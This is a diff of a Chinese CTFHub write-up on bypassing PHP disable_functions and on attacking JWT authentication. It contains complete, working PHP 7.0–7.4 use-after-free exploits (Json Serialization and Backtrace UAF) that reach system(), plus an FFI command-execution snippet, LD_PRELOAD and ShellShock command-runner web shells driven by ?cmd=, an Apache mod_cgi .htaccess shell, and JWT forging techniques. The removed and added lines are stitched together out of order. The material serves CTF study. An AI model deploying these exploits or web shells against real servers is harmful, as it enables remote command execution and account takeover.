-    public function get_basic_funcs($base, $elf) {
-        list($data_addr, $text_size, $data_size) = $elf;
-        for($i = 0; $i < $data_size / 8; $i++) {
-            $leak = $this->leak2($data_addr, $i * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
-                $deref = $this->leak2($leak);
-                # 'constant' constant check
-                if($deref != 0x746e6174736e6f63)
-                    continue;
-            } else continue;
-
-            $leak = $this->leak2($data_addr, ($i + 4) * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
-                $deref = $this->leak2($leak);
-                # 'bin2hex' constant check
-                if($deref != 0x786568326e6962)
-                    continue;
-            } else continue;
-
-            return $data_addr + $i * 8;
-        }
-    }
-
-    public function get_binary_base($binary_leak) {
-        $base = 0;
-        $start = $binary_leak & 0xfffffffffffff000;
-        for($i = 0; $i < 0x1000; $i++) {
-            $addr = $start - 0x1000 * $i;
-            $leak = $this->leak2($addr, 0, 7);
-            if($leak == 0x10102464c457f) { # ELF header
-                return $addr;
-            }
-        }
-    }
-
-    public function get_system($basic_funcs) {
-        $addr = $basic_funcs;
-        do {
-            $f_entry = $this->leak2($addr);
-            $f_name = $this->leak2($f_entry, 0, 6);
-
-            if($f_name == 0x6d6574737973) { # system
-                return $this->leak2($addr + 8);
-            }
-            $addr += 0x20;
-        } while($f_entry != 0);
-        return false;
-    }
-
-    public function jsonSerialize() {
-        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;
-
-        $contiguous = [];
-        for($i = 0; $i < $n_alloc; $i++)
-            $contiguous[] = new DateInterval('PT1S');
-
-        $room = [];
-        for($i = 0; $i < $n_alloc; $i++)
-            $room[] = new Z();
-
-        $_protector = $this->ptr2str(0, 78);
-
-        $this->abc = $this->ptr2str(0, 79);
-        $p = new DateInterval('PT1S');
-
-        unset($y[0]);
-        unset($p);
-
-        $protector = ".$_protector";
-
-        $x = new DateInterval('PT1S');
-        $x->d = 0x2000;
-        $x->h = 0xdeadbeef;
-        # $this->abc is now of size 0x2000
-
-        if($this->str2ptr($this->abc) != 0xdeadbeef) {
-            die('UAF failed.');
-        }
-
-        $spl1 = new MySplFixedArray();
-        $spl2 = new MySplFixedArray();
-
-        # some leaks
-        $class_entry = $this->str2ptr($this->abc, 0x120);
-        $handlers = $this->str2ptr($this->abc, 0x128);
-        $php_heap = $this->str2ptr($this->abc, 0x1a8);
-        $abc_addr = $php_heap - 0x218;
-
-        # create a fake class_entry
-        $fake_obj = $abc_addr;
-        $this->write($this->abc, 0, 2); # type
-        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry
-
-        # copy some of class_entry definition
-        for($i = 0; $i < 16; $i++) {
-            $this->write($this->abc, 0x10 + $i * 8, 
-                $this->leak1($class_entry + 0x10 + $i * 8));
-        }
-
-        # fake static members table
-        $fake_tbl_off = 0x70 * 4 - 16;
-        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
-        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);
-
-        # fake zval_reference
-        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
-        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)
-
-        # look for binary base
-        $binary_leak = $this->leak2($handlers + 0x10);
-        if(!($base = $this->get_binary_base($binary_leak))) {
-            die("Couldn't determine binary base address");
-        }
-
-        # parse elf header
-        if(!($elf = $this->parse_elf($base))) {
-            die("Couldn't parse ELF");
-        }
-
-        # get basic_functions address
-        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
-            die("Couldn't get basic_functions address");
-        }
-
-        # find system entry
-        if(!($zif_system = $this->get_system($basic_funcs))) {
-            die("Couldn't get zif_system address");
-        }
-        
-        # copy hashtable offsetGet bucket
-        $fake_bkt_off = 0x70 * 5 - 16;
-
-        $function_data = $this->str2ptr($this->abc, 0x50);
-        for($i = 0; $i < 4; $i++) {
-            $this->write($this->abc, $fake_bkt_off + $i * 8, 
-                $this->leak2($function_data + 0x40 * 4, $i * 8));
-        }
-
-        # create a fake bucket
-        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
-        $this->write($this->abc, 0x50, $fake_bkt_addr);
-        for($i = 0; $i < 3; $i++) {
-            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
-        }
-
-        # copy bucket zval
-        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
-        for($i = 0; $i < 12; $i++) {
-            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, 
-                $this->leak2($function_zval, $i * 8));
-        }
-
-        # pwn
-        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
-        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);
-
-        $spl1->offsetGet($cmd);
-
-        exit();
-    }
-}
-
-$y = [new Z()];
-json_encode([&$y]);
--
-蚁剑链接
-![Json Serialization UAF 1](/ctfhub/images/web15.png)
-上传exploit
-![Json Serialization UAF 2](/ctfhub/images/web16.png)
-访问exploit
-![Json Serialization UAF 3](/ctfhub/images/web17.png)
-
-7.Backtrace UAF
-该漏洞利用在debug_backtrace()函数中使用了两年的一个bug。我们可以诱使它返回对已被破坏的变量的引用,从而导致释放后使用漏洞。
-Linux 操作系统
-PHP 版本•7.0 - all versions to date
-7.1 - all versions to date
-7.2 - all versions to date
-7.3 < 7.3.15 (released 20 Feb 2020)
-7.4 < 7.4.3 (released 20 Feb 2020)
-exploit:
-<?php
-
-# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
-#
-# Bug: https://bugs.php.net/bug.php?id=76047
-# debug_backtrace() returns a reference to a variable 
-# that has been destroyed, causing a UAF vulnerability.
-#
-# This exploit should work on all PHP 7.0-7.4 versions
-# released as of 30/01/2020.
-#
-# Author: https://github.com/mm0r1
-
-pwn("tac /flag");            // 可替换成需要执行的命令
-
-function pwn($cmd) {
-    global $abc, $helper, $backtrace;
-
-    class Vuln {
-        public $a;
-        public function __destruct() { 
-            global $backtrace; 
-            unset($this->a);
-            $backtrace = (new Exception)->getTrace(); # ;)
-            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
-                $backtrace = debug_backtrace();
-            }
-        }
-    }
-
-    class Helper {
-        public $a, $b, $c, $d;
-    }
-
-    function str2ptr(&$str, $p = 0, $s = 8) {
-        $address = 0;
-        for($j = $s-1; $j >= 0; $j--) {
-            $address <<= 8;
-            $address |= ord($str[$p+$j]);
-        }
-        return $address;
-    }
-
-    function ptr2str($ptr, $m = 8) {
-        $out = "";
-        for ($i=0; $i < $m; $i++) {
-            $out .= chr($ptr & 0xff);
-            $ptr >>= 8;
-        }
-        return $out;
-    }
-
-    function write(&$str, $p, $v, $n = 8) {
-        $i = 0;
-        for($i = 0; $i < $n; $i++) {
-            $str[$p + $i] = chr($v & 0xff);
-            $v >>= 8;
-        }
-    }
-
-    function leak($addr, $p = 0, $s = 8) {
-        global $abc, $helper;
-        write($abc, 0x68, $addr + $p - 0x10);
-        $leak = strlen($helper->a);
-        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
-        return $leak;
-    }
-
-    function parse_elf($base) {
-        $e_type = leak($base, 0x10, 2);
-
-        $e_phoff = leak($base, 0x20);
-        $e_phentsize = leak($base, 0x36, 2);
-        $e_phnum = leak($base, 0x38, 2);
-
-        for($i = 0; $i < $e_phnum; $i++) {
-            $header = $base + $e_phoff + $i * $e_phentsize;
-            $p_type  = leak($header, 0, 4);
-            $p_flags = leak($header, 4, 4);
-            $p_vaddr = leak($header, 0x10);
-            $p_memsz = leak($header, 0x28);
-
-            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
-                # handle pie
-                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
-                $data_size = $p_memsz;
-            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
-                $text_size = $p_memsz;
-            }
-        }
-
-        if(!$data_addr || !$text_size || !$data_size)
-            return false;
-
-        return [$data_addr, $text_size, $data_size];
-    }
-
-    function get_basic_funcs($base, $elf) {
-        list($data_addr, $text_size, $data_size) = $elf;
-        for($i = 0; $i < $data_size / 8; $i++) {
-            $leak = leak($data_addr, $i * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
-                $deref = leak($leak);
-                # 'constant' constant check
-                if($deref != 0x746e6174736e6f63)
-                    continue;
-            } else continue;
-
-            $leak = leak($data_addr, ($i + 4) * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
-                $deref = leak($leak);
-                # 'bin2hex' constant check
-                if($deref != 0x786568326e6962)
-                    continue;
-            } else continue;
-
-            return $data_addr + $i * 8;
-        }
-    }
-
-    function get_binary_base($binary_leak) {
-        $base = 0;
-        $start = $binary_leak & 0xfffffffffffff000;
-        for($i = 0; $i < 0x1000; $i++) {
-            $addr = $start - 0x1000 * $i;
-            $leak = leak($addr, 0, 7);
-            if($leak == 0x10102464c457f) { # ELF header
-                return $addr;
-            }
-        }
-    }
-
-    function get_system($basic_funcs) {
-        $addr = $basic_funcs;
-        do {
-            $f_entry = leak($addr);
-            $f_name = leak($f_entry, 0, 6);
-
-            if($f_name == 0x6d6574737973) { # system
-                return leak($addr + 8);
-            }
-            $addr += 0x20;
-        } while($f_entry != 0);
-        return false;
-    }
-
-    function trigger_uaf($arg) {
-        # str_shuffle prevents opcache string interning
-        $arg = str_shuffle(str_repeat('A', 79));
-        $vuln = new Vuln();
-        $vuln->a = $arg;
-    }
-
-    if(stristr(PHP_OS, 'WIN')) {
-        die('This PoC is for *nix systems only.');
-    }
-
-    $n_alloc = 10; # increase this value if UAF fails
-    $contiguous = [];
-    for($i = 0; $i < $n_alloc; $i++)
-        $contiguous[] = str_shuffle(str_repeat('A', 79));
-
-    trigger_uaf('x');
-    $abc = $backtrace[1]['args'][0];
-
-    $helper = new Helper;
-    $helper->b = function ($x) { };
-
-    if(strlen($abc) == 79 || strlen($abc) == 0) {
-        die("UAF failed");
-    }
-
-    # leaks
-    $closure_handlers = str2ptr($abc, 0);
-    $php_heap = str2ptr($abc, 0x58);
-    $abc_addr = $php_heap - 0xc8;
-
-    # fake value
-    write($abc, 0x60, 2);
-    write($abc, 0x70, 6);
-
-    # fake reference
-    write($abc, 0x10, $abc_addr + 0x60);
-    write($abc, 0x18, 0xa);
-
-    $closure_obj = str2ptr($abc, 0x20);
-
-    $binary_leak = leak($closure_handlers, 8);
-    if(!($base = get_binary_base($binary_leak))) {
-        die("Couldn't determine binary base address");
-    }
-
-    if(!($elf = parse_elf($base))) {
-        die("Couldn't parse ELF header");
-    }
-
-    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
-        die("Couldn't get basic_functions address");
-    }
-
-    if(!($zif_system = get_system($basic_funcs))) {
-        die("Couldn't get zif_system address");
-    }
-
-    # fake closure object
-    $fake_obj_offset = 0xd0;
-    for($i = 0; $i < 0x110; $i += 8) {
-        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
-    }
-
-    # pwn
-    write($abc, 0x20, $abc_addr + $fake_obj_offset);
-    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
-    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
-
-    ($helper->b)($cmd);
-    exit();
-}
--
-蚁剑链接
-![Backtrace UAF 1](/ctfhub/images/web18.png)
-上传exploit
-![Backtrace UAF 2](/ctfhub/images/web19.png)
-访问exploit
-![Backtrace UAF 3](/ctfhub/images/web20.png)
-
-8.FFI扩展
-FFI（Foreign Function Interface）,即外部函数接口。是指在一种语言里调用另一种语言代码的技术。PHP在7.4版本中新增加了此扩展,PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。FFI的使用只需声明和调用两步。
-Linux操作系统
-PHP>=7.4
-开启了FFI扩展且ffi.enable=true
-exploit:
-<?php
-    $ffi = FFI::cdef("int system(const char *command);");   # 声明ffi,调用system函数
-    $ffi->system("tac /flag > /var/www/html/flag.txt");   # 执行命令读取flag
-    echo file_get_contents("/var/www/html/flag.txt");
-    // @unlink("/var/www/html/flag.txt");    # 删除flag.txt文件
-?>
--
-蚁剑连接
-![FFI扩展 1](/ctfhub/images/web21.png)
-上传exploit
-![FFI扩展 2](/ctfhub/images/web22.png)
-getflag
-![FFI扩展 3](/ctfhub/images/web23.png)
-
-9.iconv
-php在执行iconv函数时,实际上是调用glibc中的iconv相关函数,其中一个很重要的函数叫做iconv_open()
-linux系统提供了一个环境变量:GCONV_PATH,该环境变量能够使glibc使用用户自定义的gconv-modules文件,因此,如果指定了GCONV_PATH的值,iconv_open函数的执行过程会如下:
-1.iconv_open函数依照GCONV_PATH找到gconv-modules文件,这个文件中包含了各个字符集的相关信息存储的路径,每个字符集的相关信息存储在一个.so文件中,即gconv-modules文件提供了各个字符集的.so文件所在位置。
-2.根据gconv-modules文件的指示找到参数对应的.so文件。
-3.调用.so文件中的gconv()和gonv_init()函数。
-4.一些其他步骤。
-我们的利用方式就是首先在某一文件夹（一般是/tmp）中上传gconv-modules文件,文件中指定我们自定义的字符集文件的.so,然后我们再在.so文件中的gonv_init()函数中书写命令执行函数,之后上传php的shell,内容是使用php设定GCONV_PATH指向我们的]gconv-modules文件,然后使用iconv函数使我们的恶意代码执行。
-Linux操作系统
-putenv可用
-PHP安装了iconv相关模块
-存在可写的目录,需要上传.so文件
--
-现在来看题目,首先上传gconv-modules文件到/tmp
-![iconv 1](/ctfhub/images/iconv1.png)
-编写payload编译成.so文件,上传到正确的目录/tmp
-![iconv 2](/ctfhub/images/iconv2.png)
-上传exp.php后访问获得flag
-![iconv 3](/ctfhub/images/iconv3.png)
-![iconv 4](/ctfhub/images/iconv4.png)
-
-10.bypass iconv 1
-phpinfo看一下,发现禁了iconv函数,但我们还能用iconv_strlen函数
-![bypass iconv 1 1](/ctfhub/images/iconv5.png)
-改一改exp.php就行
-![bypass iconv 1 2](/ctfhub/images/iconv6.png)
-
-11.bypass iconv 2
-这次再用phpinfo看一下,发现禁了一大堆iconv函数,但没有关系,可以使用file_get_contents和fopen的convert.iconv过滤器
-![bypass iconv 2 1](/ctfhub/images/iconv7.png)
-继续改一改payload就没问题
-![bypass iconv 2 2](/ctfhub/images/iconv8.png)
-
-Linux
-1.动态加载器
-Linux ELF Dynaamic Loader,即Linux ELF动态加载器。动态加载是一种机制,通过该机制,计算机程序可以在运行时将库(或其他二进制)加载到存储器中,检索包含在库中的函数和变量的地址,执行那些函数或访问那些变量,以及从存储器中卸载库。它是计算机程序使用其他软件的三种机制之一,另外两种是静态链接和动态链接。与静态链接和动态链接不同,动态加载允许计算机程序在缺少这些库的情况下启动,以发现可用的库,并潜在地获得附加功能。
-而在Linux中,通过readelf -e命令查看执行文件,可以从Program Headers中看到文件类型信息,其中Requesting program interpreter: /lib64/ld-linux-x86-64.so.2指明该文件使用的是动态加载,还可以用ldd命令查看文件依赖关系。
-/lib64/ld-linux-x86-64.so.2则是Linux中用于64位ELF可执行文件的动态链接器。它加载可执行文件,解析并加载程序依赖的动态库,设置内存布局,同时还将控制权交给程序的入口点。它本身是一个可执行文件,具有执行权限,不仅可以由内核自动调用,也可以手动调用。当直接运行动态链接器并传递一个ELF文件作为参数时,动态链接器会读取文件的ELF头,解析其依赖和入口点,加载所有需要的动态库并执行ELF文件的代码。
--
-连接到webshell,可以看到flag文件是644权限,不具备执行权限。
-![动态加载器 1](/ctfhub/images/linux1.png)
-通常,内核在执行可执行文件时,会首先检查文件权限,如果权限不足,则会拒绝执行。但通过/lib64/ld-linux-x86-64.so.2执行flag文件,实际执行的是动态链接器,readflag只是作为参数传递。动态链接器加载ELF文件只需要读取权限,而不需要目标文件有执行权限,
-![动态加载器 2](/ctfhub/images/linux2.png)
-本质上在执行./readflag时,shell会调用execve来执行这个程序,此时,内核会检查程序权限并调用动态链接器,如果权限不足则拒绝执行。但通过直接手动调用动态链接器则跳过了内核的权限检查
-
-JSON Web Token
-什么是JWT
-Json Web Token (JWT),是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（[RFC 7519](https://tools.ietf.org/html/rfc7519)。
-该token被设计为紧凑且安全的,特别适用于分布式站点的单点登录（SSO）场景,是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息,以便于从资源服务器获取资源,也可以增加一些额外的其它业务逻辑所必须的声明信息,该token也可直接被用于认证,也可被加密。
-JWT的原理
-JWT的原理是,服务器认证以后,生成一个JSON对象,发回给用户,就像下面这样。
-```JSON
-{
-  "姓名": "张三",
-  "角色": "管理员",
-  "到期时间": "2018年7月1日0点0分"
-}
-```
-以后,用户与服务端通信的时候,都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据,服务器在生成这个对象的时候,会加上签名（详见后文）。
-服务器就不保存任何session数据了,也就是说,服务器变成无状态了,从而比较容易实现扩展。
-JWT的数据结构
-实际当中JWT长这个样子:
-```text
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ
-```
-它是一个很长的字符串,中间用点（.）分隔成三个部分。注意,JWT内部是没有换行的
-JWT的三个部分依次如下:
-- Header（头部）
-- Payload（负载）
-- Signature（签名）
-写成一行，就是下面的样子。
-```text
-Header.Payload.Signature
-```
-每个部分最后都会使用base64URLEncode方式进行编码
-```Python
-#!/usr/bin/env python
-function base64url_encode($data) {
-    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
-} 
-```
-Header
-Header部分是一个JSON对象,描述JWT的元数据,以上面的例子,使用base64decode之后:
-```text
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
-```
-```JSON
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
-```
-header部分最常用的两个字段是alg和typ。
-alg属性表示token签名的算法(algorithm),最常用的为HMAC和RSA算法
-typ属性表示这个token的类型（type）,JWT令牌统一写为JWT。
-Payload
-Payload部分也是一个JSON对象,用来存放实际需要传递的数据。JWT规定了7个官方字段供选用。
-- iss (issuer)：签发人
-- exp (expiration time)：过期时间
-- sub (subject)：主题
-- aud (audience)：受众
-- nbf (Not Before)：生效时间
-- iat (Issued At)：签发时间
-- jti (JWT ID)：编号
-除了官方字段,还可以在这个部分定义私有字段,以上面的例子为例,将payload部分解base64之后:
-```text
-eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0
-```
-```JSON
-{
-  "sub": "1234567890",
-  "name": "CTFHub",
-  "iat": 1516239022
-}
-```
-注意:JWT默认是不会对Payload加密的,也就意味着任何人都可以读到这部分JSON的内容,所以不要将私密的信息放在这个部分
-Signature
-Signature部分是对前两部分的签名,防止数据篡改
-首先,需要指定一个密钥（secret）。这个密钥只有服务器才知道,不能泄露给用户。然后,使用Header里面指定的签名算法（默认是 HMAC SHA256）,按照下面的公式产生签名。
-```JSON
-HMACSHA256(
-  base64UrlEncode(header) + "." +
-  base64UrlEncode(payload),
-  secret)
-```
-算出签名以后,把Header、Payload、Signature三个部分拼成一个字符串,每个部分之间用"点"（.）分隔,就可以返回给用户。
-
-1.敏感信息泄露
-抓包获得token
-![敏感信息泄露 1](/ctfhub/images/jwt1.png)
-JWT的header与payload默认不加密,使用base64编码,如果将敏感信息存储在其中很容易造成敏感信息泄露
-![敏感信息泄露 2](/ctfhub/images/jwt2.png)
-
-2.无签名
-无签名,即不使用签名算法,当alg字段为空时,后端将不执行签名验证。因此抓包获取token
-![无签名 1](/ctfhub/images/jwt3.png)
-解码header和payload,将其中的alg字段改为none,再重新base64编码回去
-![无签名 2](/ctfhub/images/jwt4.png)
-重发修改后的包
-![无签名 3](/ctfhub/images/jwt5.png)
-
-3.弱密钥
-jwt利用工具有jwt_tool(验证、伪造和破解JWT令牌)、jwt-cracker(破解HS256密钥JWT)、c-jwt-cracker等等。
-因此我们可以使用jwt-cracker来破解对称加密的JWT令牌。
-首先抓包获取token
-![弱密钥 1](/ctfhub/images/jwt6.png)
-使用jwt-cracker破解密钥
-![弱密钥 2](/ctfhub/images/jwt7.png)
-通过密钥修改包
-![弱密钥 3](/ctfhub/images/jwt8.png)
-重发包获得flag
-![弱密钥 4](/ctfhub/images/jwt9.png)
-
-4.修改签名算法
-有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时,有时攻击者可以获取到公钥
-此时可通过修改JWT头部的签名算法,将非对称密码算法改为对称密码算法,从而达到攻击者目的。
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta charset="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-        <title>CTFHub JWTDemo</title>
-        <link rel="stylesheet" href="/static/style.css" />
-    </head>
-    <body>
-        <main id="content">
-            <header>Web Login</header>
-            <form id="login-form" method="POST">
-                <input type="text" name="username" placeholder="Username" />
-                <input type="password" name="password" placeholder="Password" />
-                <input type="submit" name="action" value="Login" />
-            </form>
-            <a href="/publickey.pem">publickey.pem</a>
-        </main>
-        <?php echo $_COOKIE['token'];?>
-        <hr/>
-    </body>
-</html>
-
-<?php
-require __DIR__ . '/vendor/autoload.php';
-use \Firebase\JWT\JWT;
-
-class JWTHelper {
-  public static function encode($payload=array(), $key='', $alg='HS256') {
-    return JWT::encode($payload, $key, $alg);
-  }
-  public static function decode($token, $key, $alg='HS256') {
-    try{
-            $header = JWTHelper::getHeader($token);
-            $algs = array_merge(array($header->alg, $alg));
-      return JWT::decode($token, $key, $algs);
-    } catch(Exception $e){
-      return false;
-    }
-    }
-    public static function getHeader($jwt) {
-        $tks = explode('.', $jwt);
-        list($headb64, $bodyb64, $cryptob64) = $tks;
-        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
-        return $header;
-    }
-}
-
-$FLAG = getenv("FLAG");
-$PRIVATE_KEY = file_get_contents("/privatekey.pem");
-$PUBLIC_KEY = file_get_contents("./publickey.pem");
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (!empty($_POST['username']) && !empty($_POST['password'])) {
-        $token = "";
-        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
-            $jwt_payload = array(
-                'username' => $_POST['username'],
-                'role'=> 'admin',
-            );
-            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
+        // 将命令写入输出文件，并重定向错误输出
+        $output_file = "/var/www/html/output.txt"; // 确保此路径可写
+        $shell_command = $command . " > " . $output_file . " 2>&1";
+
+        // 设置包含命令的环境变量
+        putenv("_evilcmd=" . $shell_command);
+
+        // 设置 LD_PRELOAD 环境变量，指向上传的 .so 文件
+        // 假设 evil.so 与 trigger.php 在同一目录
+        putenv("LD_PRELOAD=./evil.so"); 
+
+        // 触发子进程
+        if (function_exists('mail')) {
+            // 参数不重要，只是为了触发 sendmail 进程
+            mail("a@a.com", "subject", "message", "From: b@b.com"); 
+        } elseif (function_exists('error_log')) {
+            // 向不存在的文件或邮件地址记录错误也会触发
+            error_log("triggering preload", 1, "dummy@example.com"); 
         } else {
-            $jwt_payload = array(
-                'username' => $_POST['username'],
-                'role'=> 'guest',
-            );
-            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
+            die("No suitable function (mail or error_log) found to trigger LD_PRELOAD.");
         }
-        @setcookie("token", $token, time()+1800);
-        header("Location: /index.php");
-        exit();
-    } else {
-        @setcookie("token", "");
-        header("Location: /index.php");
-        exit();
-    }
-} else {
-    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
-        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
-        if ($obj->role === 'admin') {
-            echo $FLAG;
+
+        // (可选) 等待命令执行完成并读取结果
+        sleep(1); // 给点时间执行命令
+        if (file_exists($output_file)) {
+            echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
+            // unlink($output_file); // 清理
+        } else {
+            echo "Output file not found or command failed.";
+        }
+        ?>
+        ```
+    4.  **执行:** 上传 `evil.so` 和 `trigger.php` 到 Web 服务器的可写目录，然后访问 `trigger.php?cmd=ls -al /`。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![LD_PRELOAD 1](/ctfhub/images/web1.png)
+    (蚁剑连接)
+    ![LD_PRELOAD 2](/ctfhub/images/web2.png)
+    (上传 `evil.so` 和 `trigger.php`，然后访问 `trigger.php?cmd=tac /flag`)
+    ![LD_PRELOAD 3](/ctfhub/images/web3.png)
+    (获取 Flag)
+*   **注意事项 (Considerations):** 需要 `putenv` 和一个能 fork 子进程的函数。蚁剑等工具有自动化此过程的插件。
+
+### 3. ShellShock (Bash 漏洞 CVE-2014-6271)
+
+*   **概述 (Overview):** ShellShock 是 GNU Bash 4.3 及更早版本中的一个严重漏洞。Bash 在处理特定构造的环境变量（其值包含一个函数定义 `() { :;};` 后跟额外字符串）时，会错误地执行函数定义后面的额外字符串作为命令。
+*   **工作原理 (Working Principle):**
+    1.  Bash 在初始化时会扫描环境变量。如果一个环境变量的值看起来像一个函数定义（以 `() {` 开头），Bash 会将其导入为当前 Shell 环境中的一个函数。
+    2.  漏洞在于，Bash 在解析函数定义时，没有在结束花括号 `}` 后停止处理，而是继续执行了该环境变量值中 `}` 之后的任何命令。
+    3.  **利用:** 构造一个环境变量，其值为 `() { <任意内容>; }; <要执行的命令>`。当一个新 Bash 进程（子进程）启动并导入这个环境变量时，`<要执行的命令>` 就会被意外执行。
+    4.  **在 PHP 中:** 使用 `putenv()` 设置恶意的环境变量，然后调用 `mail()` 或 `error_log()` 触发子进程（通常是 `/bin/sh`，如果它链接到易受攻击的 Bash）。
+*   **利用条件 (Exploitation Conditions):**
+    *   目标系统使用的 Bash 版本 <= 4.3 且存在 ShellShock 漏洞。
+    *   `/bin/sh` 链接到易受攻击的 Bash (常见情况)。
+    *   `putenv()` 函数可用。
+    *   至少有一个能触发子进程的函数可用 (如 `mail()`, `error_log()`)。
+    *   攻击者能够控制传递给子进程的环境变量。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    1.  **检测 Payload:**
+        ```bash
+        env x='() { :;}; echo vulnerable' bash -c "echo test" 
+        ```
+        如果输出包含 "vulnerable"，则存在漏洞。
+    2.  **PHP 触发 Payload:**
+        ```php
+        <?php
+        function runcmd_shellshock($command) {
+            $output_file = "/var/www/html/output_shellshock.txt"; // 确保可写
+            $shell_command = $command . " > " . $output_file . " 2>&1";
+          
+            // 检查所需函数是否可用
+            if (function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))) {
+                // 设置包含函数定义和要执行命令的环境变量
+                putenv("PHP_SHELLSHOCK=() { :; }; " . $shell_command);  
+                
+                // 触发子进程 (error_log 通常更可靠)
+                if (function_exists('error_log')) {
+                    error_log("triggering shellshock", 1); // 参数不重要
+                } else {
+                    mail("a@a.com", "a", "a", "a");
+                }
+
+                // 读取结果
+                sleep(1); 
+                if (file_exists($output_file)) {
+                    echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
+                    // unlink($output_file); 
+                } else {
+                     echo "Output file not found or command failed.";
+                }
+            } else {
+                print("Required functions (putenv and mail/error_log) not available.");
+            }
+        }
+
+        // 从 GET 参数获取命令
+        if(isset($_GET['cmd'])) {
+            runcmd_shellshock($_GET['cmd']);
+        } else {
+            echo "Usage: ?cmd=<command>";
+        }
+        ?>
+        ```
+    3.  **执行:** 上传此 PHP 文件，访问 `shellshock_trigger.php?cmd=id`。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![ShellShock 1](/ctfhub/images/web4.png)
+    (提供蚁剑连接信息)
+    ![ShellShock 2](/ctfhub/images/web5.png)
+    (上传上述 PHP Payload，并访问 `payload.php?cmd=tac /flag`)
+    ![ShellShock 3](/ctfhub/images/web6.png)
+    (获取 Flag)
+
+### 4. Apache Mod CGI
+
+*   **概述 (Overview):** 如果 Apache 服务器配置不当，允许在 Web 目录下使用 `.htaccess` 文件覆盖配置，并且开启了 `mod_cgi` 模块，攻击者可以上传一个 `.htaccess` 文件来指示 Apache 将特定后缀（例如 `.wors`）的文件作为 CGI 脚本执行。然后上传一个该后缀的 Shell 脚本，访问它即可执行命令。
+*   **工作原理 (Working Principle):**
+    1.  **`.htaccess` 配置:** 攻击者在目标目录下创建一个 `.htaccess` 文件，内容类似：
+        ```apache
+        Options +ExecCGI
+        AddHandler cgi-script .wors 
+        ```
+        *   `Options +ExecCGI`: 允许在该目录下执行 CGI 脚本。
+        *   `AddHandler cgi-script .wors`: 告诉 Apache 将所有 `.wors` 后缀的文件交给 CGI 处理器处理。
+    2.  **上传 Shell 脚本:** 上传一个具有自定义后缀（如 `shell.wors`）的 Shell 脚本，内容类似：
+        ```bash
+        #!/bin/bash
+        echo "Content-type: text/plain" 
+        echo "" 
+        /bin/bash -c "id; ls -al; pwd; tac /flag" 
+        ```
+        **注意:** 脚本需要有可执行权限 (`chmod +x shell.wors`)，并且第一行 `#!/bin/bash` 指定解释器。输出前必须有 `Content-type` 头和空行。
+    3.  **触发执行:** 当用户通过 Web 访问 `shell.wors` 时，Apache 会根据 `.htaccess` 的配置，将其作为 CGI 脚本执行，运行其中的 Shell 命令。
+*   **利用条件 (Exploitation Conditions):**
+    *   目标 Web 服务器是 Apache + PHP。
+    *   Apache 加载了 `mod_cgi` 模块。
+    *   目标 Web 目录的 Apache 配置中 `AllowOverride` 指令允许 `.htaccess` 文件覆盖 `Options` 和 `AddHandler` (通常需要 `AllowOverride All` 或至少 `AllowOverride Options FileInfo`)。
+    *   目标目录可写，允许上传 `.htaccess` 和 Shell 脚本。
